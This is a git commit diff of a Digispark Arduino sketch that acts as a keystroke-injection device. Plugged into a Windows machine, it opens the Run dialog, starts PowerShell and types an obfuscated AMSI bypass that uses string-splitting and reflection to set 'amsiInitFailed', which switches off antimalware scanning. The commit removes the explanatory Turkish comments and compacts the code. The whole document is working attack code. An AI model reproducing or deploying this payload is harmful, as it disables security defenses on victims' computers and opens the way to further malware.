1223f0a1a65f8fcc206dd53ce6f9d7a2bfaa32ee
NoName8080 <132585097+NoName4040@users.noreply.github.com>
2023-07-29 06:51:08 +0400

    İnvisibleBeta.ino

--- Beta.ino
+++ Beta.ino
@@ -7,33 +7,29 @@ void setup() {pinMode(1, OUTPUT); //LED on Model A
 
 void loop() {
  
-  // İlk olarak klavye tanımlaması yapılır.
-  DigiKeyboard.delay(1000); // 1 saniye bekleme
-  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Windows + R kombinasyonu
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
     
-  DigiKeyboard.delay(1000); // 1 saniye bekleme
+  DigiKeyboard.delay(1000); 
     DigiKeyboard.print("powershell.exe");
     
-  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Enter tuşuna basma
-  DigiKeyboard.delay(1000); // 1 saniye bekleme
-  DigiKeyboard.sendKeyStroke(MOD_ALT_RIGHT, KEY_4); // Alt + 4 kombinasyonu
-  DigiKeyboard.delay(1000); // 1 saniye bekleme
-  DigiKeyboard.print("amsi=[Ref].Assembly.GetType('Sys'+'te'+'m.M'+'anage'+'ment.A'+'utom'+'ation.Am'+'siU'+'tils')");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Enter tuşuna basma
-  DigiKeyboard.delay(1000); // 1 saniye bekleme
-  DigiKeyboard.sendKeyStroke(MOD_ALT_RIGHT, KEY_4); // Alt + 4 kombinasyonu
-  DigiKeyboard.delay(1000); // 1 saniye bekleme
+  DigiKeyboard.sendKeyStroke(KEY_ENTER); 
+  DigiKeyboard.delay(1000); DigiKeyboard.sendKeyStroke(MOD_ALT_RIGHT, KEY_4);
+  DigiKeyboard.delay(1000); DigiKeyboard.print("amsi=[Ref].Assembly.GetType('Sys'+'te'+'m.M'+'anage'+'ment.A'+'utom'+'ation.Am'+'siU'+'tils')");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(MOD_ALT_RIGHT, KEY_4); 
+  DigiKeyboard.delay(1000); 
   DigiKeyboard.print("field=");
-  DigiKeyboard.sendKeyStroke(MOD_ALT_RIGHT, KEY_4); // Alt + 4 kombinasyonu
-  DigiKeyboard.delay(1000); // 1 saniye bekleme
+  DigiKeyboard.sendKeyStroke(MOD_ALT_RIGHT, KEY_4); 
+  DigiKeyboard.delay(1000);
   DigiKeyboard.print("amsi.GetField('ams'+'iInitF'+'ailed','NonP'+'ublic,S'+'tatic')");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Enter tuşuna basma
-  DigiKeyboard.delay(1000); // 1 saniye bekleme
-  DigiKeyboard.sendKeyStroke(MOD_ALT_RIGHT, KEY_4); // Alt + 4 kombinasyonu
-  DigiKeyboard.delay(1000); // 1 saniye bekleme
+  DigiKeyboard.sendKeyStroke(KEY_ENTER); 
+  DigiKeyboard.delay(1000);  DigiKeyboard.sendKeyStroke(MOD_ALT_RIGHT, KEY_4); 
+  DigiKeyboard.delay(1000); 
   DigiKeyboard.print("field.SetValue(");
-  DigiKeyboard.sendKeyStroke(MOD_ALT_RIGHT, KEY_4); // Alt + 4 kombinasyonu
-  DigiKeyboard.delay(1000); // 1 saniye bekleme
+  DigiKeyboard.sendKeyStroke(MOD_ALT_RIGHT, KEY_4); 
+  DigiKeyboard.delay(1000); 
   DigiKeyboard.print("null)");
     
     digitalWrite(1, HIGH); //turn on led when program finishes - You can unplug now
